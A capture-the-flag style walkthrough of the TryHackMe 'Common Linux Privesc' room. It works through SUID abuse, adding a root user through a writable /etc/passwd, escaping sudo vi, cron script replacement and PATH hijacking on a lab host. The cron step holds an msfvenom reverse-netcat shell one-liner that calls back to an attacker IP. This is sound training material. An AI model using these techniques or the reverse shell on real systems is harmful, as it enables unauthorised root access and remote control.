# Common Linux Privesc
A room explaining common Linux privilege escalation.  
https://tryhackme.com/room/commonlinuxprivesc
****

# [Task 1] Get Connected
**#1 Deploy the machine**  

No answer needed  

# [Task 2] Understanding Privesc
**#1 Read the information about privilege escalation**  

No answer needed  

# [Task 3] Direction of Privilege Escalation  
**#1 Understand the difference between Horizontal and Vertical privilege escalation.**  

No answer needed  

# [Task 4] Enumeration  
Download, transfer, and make executable LineEnum.sh following the directions.  

when complete lets run the script. first lets check what args we can pass.
```bash
user3@polobox:~$ ./LinEnum.sh -h

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com | @rebootuser 
# version 0.982

# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t 

OPTIONS:
-k      Enter keyword
-e      Enter export location
-s      Supply user password for sudo checks (INSECURE)
-t      Include thorough (lengthy) tests
-r      Enter report name
-h      Displays this help text


Running with no options = limited scans/no output file
#########################################################
```
Now lets run the script and output the report
```bash
user3@polobox:~$ ./LinEnum.sh -t -r linenum_report -e /~
```

**#1 First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.**  

No answer needed  

**#2 What is the target's hostname?**  

Answer: polobox

**#3 Look at the output of /etc/passwd how many "user[x]" are there on the system?**  

```bash
user3@polobox:~$ cat /etc/passwd | grep user*
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
user4:x:1003:1003:user4,,,:/home/user4:/bin/bash
user5:x:1004:1004:user5,,,:/home/user5:/bin/bash
user6:x:1005:1005:user6,,,:/home/user6:/bin/bash
user7:x:1006:0:user7,,,:/home/user7:/bin/bash
user8:x:1007:1007:user8,,,:/home/user8:/bin/bash
```

Answer: 8  

**#4 How many available shells are there on the system?**  

```bash
user3@polobox:~$ cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
```  

Answer: 4  

**#5 What is the name of the bash script that is set to run every 5 minutes by cron?**  
  
This can be found in 2 places. The report we generated by running the following command to open the report with nano. Press ctrl+W and search "crontab contents".
```bash
user3@polobox:~$ nano linenum_report-22-08-20
```
or use the cat command:
```bash
user3@polobox:~$ cat /etc/crontab
```
either way look for the line:
```bash
*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
```  

Answer: autoscript.sh  

**#6 What critical file has had its permissions changed to allow some users to write to it?**  
  
This can be found in our linenum report. open the report with nano press ctrl+W and search for "sensitive"

```
Can we read/write sensitive files:
-rw-rw-r-- 1 root root 2694 Mar  6 07:08 /etc/passwd
-rw-r--r-- 1 root root 1087 Jun  5  2019 /etc/group
-rw-r--r-- 1 root root 581 Apr 22  2016 /etc/profile
-rw-r----- 1 root shadow 2359 Mar  6 07:07 /etc/shadow
```
As you can see /etc/passwd has been changed to have write privs.  
  
Answer: /etc/passwd  

**#7 Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!**  

No answer needed  

# [Task 5] Abusing SUID/GUID Files
  
**#1 What is the path of the file in user3's directory that stands out to you?**  
  
This can be found in our linenum report. open the report with nano press ctrl+W and search for "SUID"
```bash
user3@polobox:~$ nano linenum_report-22-08-20
```
The only file in user3's directory is /home/user3/shell  

```
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell
```
  
Answer: /home/user3/shell

**#2 We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it! We can do this by running: "./shell"**  

```bash
user3@polobox:~$ ./shell
You Cant Find Me

root@polobox:~#
```
No answer needed

**#3 Congratulations! You should now have a shell as root user, well done!**  
  
No answer needed


# [Task 6] Exploiting Writeable /etc/passwd

**#1 First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"**

```bash
$ su user7
Password:
user7@polobox:~$
```

No answer needed

***#2 Having read the information above, what direction privilege escalation is this attack?**

Answer : vertical

**#3 Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"**

**What is the hash created by using this command with the salt, "new" and the password "123"?**

```bash
user7@polobox:~$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

Answer: $1$new$p7ptkEKU1HnaHpRtzNizS1

**#4 Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?**

Answer: new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

**#5 Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!**

```bash
user7@polobox:~$ nano /etc/passwd
```
add to end of file and press ctrl+O then ctrl+X

No answer needed

**#6 Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!**

```bash
user7@polobox:~$ su new
Password: 
Welcome to Linux Lite 4.4
 
You are running in superuser mode, be very careful.
 
Sunday 23 August 2020, 17:21:02
Memory Usage: 332/1991MB (16.68%)
Disk Usage: 6/217GB (3%)
 
root@polobox:/home/user7# 
```

No answer needed

# [Task 7] Escaping Vi Editor

**#1 First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"**

```bash
root@polobox:/home/user7# exit
exit
user7@polobox:~$ su user8
Password: 

user8@polobox:/home/user7$ cd ~
user8@polobox:~$
```

No answer needed

**#2 Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?**

```bash
user8@polobox:~$ sudo -l
Matching Defaults entries for user8 on polobox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
    (root) NOPASSWD: /usr/bin/vi
```

Answer: NOPASSWD

**#3 So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.**

```bash
user8@polobox:~$ sudo vi
```

No Answer needed

**#4 Now, type ":!sh" to open a shell!**

No answer needed

# [Task 8] Exploiting Crontab

**#1 First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"**

typing exit took me back to vi just type :q! to exit vi and return to user8

```bash
# exit

shell returned 100

Press ENTER or type command to continue
user8@polobox:~$
```
```bash
user8@polobox:~$ su user4
Password: 
 
user4@polobox:/home/user8$ cd ~
user4@polobox:~$
```

No answer needed

**#2 Now, on our host machine- let's create a payload for our cron exploit using msfvenom.**

No answer needed

**#3 What is the flag to specify a payload in msfvenom?**

run the following command to see flags
```bash
root@kali:~# msfvenom -h
```

Answer: -p

**#4 Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"**

```bash
root@kali:~# msfvenom -p cmd/unix/reverse_netcat lhost=10.10.25.205 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 102 bytes
mkfifo /tmp/qdrujcq; nc 10.10.25.205 8888 0</tmp/qdrujcq | /bin/sh >/tmp/qdrujcq 2>&1; rm /tmp/qdrujcq
```

No answer needed

**#5 What directory is the "autoscript.sh" under?**

```bash
user4@polobox:~$ find / -name  autoscript.sh -print 2>/dev/null
/home/user4/Desktop/autoscript.sh
```

Answer: /home/user4/Desktop/

**#6 Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"**

```bash
user4@polobox:~/Desktop$ echo "mkfifo /tmp/qdrujcq; nc 10.10.25.205 8888 0</tmp/qdrujcq | /bin/sh >/tmp/qdrujcq 2>&1; rm /tmp/qdrujcq" > /home/user4/Desktop/autoscript.sh
```

No answer needed

**#7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!**

```bash
root@kali:~# nc -lvp 8888
listening on [any] 8888 ...
```

No answer needed

**#8 After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!**

```bash
connect to [10.10.25.205] from ip-10-10-255-0.eu-west-1.compute.internal [10.10.255.0] 48574
whoami
root
```

No answer needed

# [Task 9] Exploiting PATH Variable

**#1 Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"**

```bash
user4@polobox:~$ su - user5
Password: 

user5@polobox:~$
```  

No answer needed
  
**#2 Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?**

```bash
user5@polobox:~$ ./script 
Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
```

Answer: ls  

**#3 Now we know what command to imitate, let's change directory to "tmp".**

```bash
user5@polobox:~$ cd /tmp/
user5@polobox:/tmp$ 
```

No answer needed

**#4Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:**

**echo "[whatever command we want to run]" > [name of the executable we're imitating]**

**What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating**

```bash
user5@polobox:/tmp$ echo "/bin/bash" > ls
```

Answer: echo "/bin/bash" > ls

**#5 Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?**

```bash
user5@polobox:/tmp$ chmod +x ls
```

Answer: chmod +x ls

**#6 Now, we need to change the PATH variable, so that it points to the directory where we have our imitation ***"ls"*** stored! We do this using the command ***"export PATH=/tmp:$PATH"*****

**Note, this will cause you to open a bash prompt every time you use ***"ls"***. If you need to use ***"ls"*** before you finish the exploit, use ***"/bin/ls"*** where the real ***"ls"*** executable is.**

**Once you've finished the exploit, you can exit out of root and use ***"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"*** to reset the PATH variable back to default, letting you use ***"ls"*** again!**

```bash
user5@polobox:/tmp$ export PATH=/tmp:$PATH
```

No answer needed

**#7 Now, change directory back to user5's home directory.**

```bash
user5@polobox:/tmp$ cd ~
user5@polobox:~$ 
```

No answer needed

**#8 Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!**

```bash
user5@polobox:~$ ./script 
Welcome to Linux Lite 4.4 user5
 
Saturday 29 August 2020, 16:43:24
Memory Usage: 340/1991MB (17.08%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~#
```
No answer needed

# [Task 10] Expanding Your Knowledge

**#1 Well done, you did it!**

No answer needed